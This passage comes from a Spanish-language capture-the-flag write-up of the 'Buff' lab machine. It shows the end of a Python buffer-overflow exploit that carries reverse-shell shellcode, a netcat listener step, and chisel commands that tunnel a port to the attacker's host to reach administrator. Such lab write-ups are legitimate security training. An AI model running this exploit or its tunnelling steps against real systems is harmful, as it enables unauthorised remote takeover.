b"\x93\xda\xb7\x86\xf9\x0c\x9e\x11\x96\xb5\xbb\xe9\x07\x39"
b"\x16\x94\x08\xb1\x95\x69\xc6\x32\xd3\x79\xbf\xb2\xae\x23"
b"\x16\xcc\x04\x4b\xf4\x5f\xc3\x8b\x73\x7c\x5c\xdc\xd4\xb2"
b"\x95\x88\xc8\xed\x0f\xae\x10\x6b\x77\x6a\xcf\x48\x76\x73"
b"\x82\xf5\x5c\x63\x5a\xf5\xd8\xd7\x32\xa0\xb6\x81\xf4\x1a"
b"\x79\x7b\xaf\xf1\xd3\xeb\x36\x3a\xe4\x6d\x37\x17\x92\x91"
b"\x86\xce\xe3\xae\x27\x87\xe3\xd7\x55\x37\x0b\x02\xde\x47"
b"\x46\x0e\x77\xc0\x0f\xdb\xc5\x8d\xaf\x36\x09\xa8\x33\xb2"
b"\xf2\x4f\x2b\xb7\xf7\x14\xeb\x24\x8a\x05\x9e\x4a\x39\x25"
b"\x8b")

payload = after_eip + eip + b"\x90"*16 + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.send(payload)
s.close
```

- En la máquina atacante nos colocamos en escucha a través de `nc`
- Ejecutamos el exploit
- Obteniendo:

  ![Untitled](/assets/img/Buff/Pasted image 20240401231314.png)

  Se ha logrado acceder a la máquina objetivo. Después de verificar la eficacia del exploit de manera local, se procede a ejecutarlo contra la máquina víctima.

## Shell as administrator

- Modificando shellcode con la IP correspondiente a la VPN

  ![Untitled](/assets/img/Buff/Pasted image 20240401231634.png)

Transfiriendo binario de chisel a la máquina víctima `10.10.10.198`

![Untitled](/assets/img/Buff/Pasted image 20240401232036.png)

Levantando servidor chisel y conectándonos:

```bash
## Maquina atacante - servidor chisel
./chisel server --reverse -p 1234

## Maquina Windows - client
chisel.exe client 10.10.14.12:1234 R:8888:127.0.0.1:8888
```

![Untitled](/assets/img/Buff/Pasted image 20240401232305.png)

Poniéndonos en escucha a través de `nc` y ejecutando exploit:

![Untitled](/assets/img/Buff/Pasted image 20240401232636.png)

Ganamos accesos como el usuario `administrator`

![Untitled](/assets/img/Buff/Pasted image 20240401232803.png)
